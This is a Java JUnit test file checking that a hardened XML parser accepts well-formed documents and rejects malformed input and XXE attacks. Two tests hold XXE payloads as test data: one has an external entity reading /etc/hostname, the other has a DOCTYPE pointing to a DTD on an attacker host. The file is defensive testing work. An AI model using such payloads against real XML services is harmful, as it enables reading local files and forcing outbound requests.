package io.github.fr4ncisx.arca.wsaa.internal.xml;

import org.jspecify.annotations.NullMarked;
import org.junit.jupiter.api.Test;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.xml.sax.SAXException;

import javax.xml.parsers.ParserConfigurationException;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

/**
 * Validates that {@link HardenedXmlParser} parses well-formed documents while
 * rejecting XXE attack vectors such as DOCTYPE declarations and external
 * entity references.
 *
 * @author fr4ncisx
 * @since 1.3.0
 */
@NullMarked
@SuppressWarnings("null")
class HardenedXmlParserTest {

    /**
     * Verifies that a well-formed document is parsed and its elements are reachable.
     */
    @Test
    void parsesWellFormedDocument() throws Exception {
        var xml = "<root><child>value</child></root>";

        Document doc = HardenedXmlParser.parse(xml);

        assertThat(doc.getDocumentElement().getTagName()).isEqualTo("root");
        Element child = (Element) doc.getElementsByTagName("child").item(0);
        assertThat(child.getTextContent()).isEqualTo("value");
    }

    /**
     * Verifies that a DOCTYPE declaration referencing an external file entity
     * is rejected instead of resolved from the host filesystem.
     */
    @Test
    void rejectsDoctypeWithExternalFileEntity() {
        var attack = """
            <?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
            <root><faultstring>&xxe;</faultstring></root>
            """;

        assertThatThrownBy(() -> HardenedXmlParser.parse(attack))
                .isInstanceOf(SAXException.class);
    }

    /**
     * Verifies that a DOCTYPE declaration referencing an external HTTP DTD is
     * rejected instead of triggering an outbound request.
     */
    @Test
    void rejectsDoctypeWithExternalHttpDtd() {
        var attack = """
            <?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE root SYSTEM "http://attacker.example.com/evil.dtd">
            <root>content</root>
            """;

        assertThatThrownBy(() -> HardenedXmlParser.parse(attack))
                .isInstanceOf(Exception.class)
                .isNotInstanceOf(ParserConfigurationException.class);
    }

    /**
     * Verifies that a malformed document fails parsing instead of returning
     * partial content.
     */
    @Test
    void rejectsMalformedDocument() {
        var broken = "<root><unclosed></root>";

        assertThatThrownBy(() -> HardenedXmlParser.parse(broken))
                .isInstanceOf(Exception.class);
    }
}
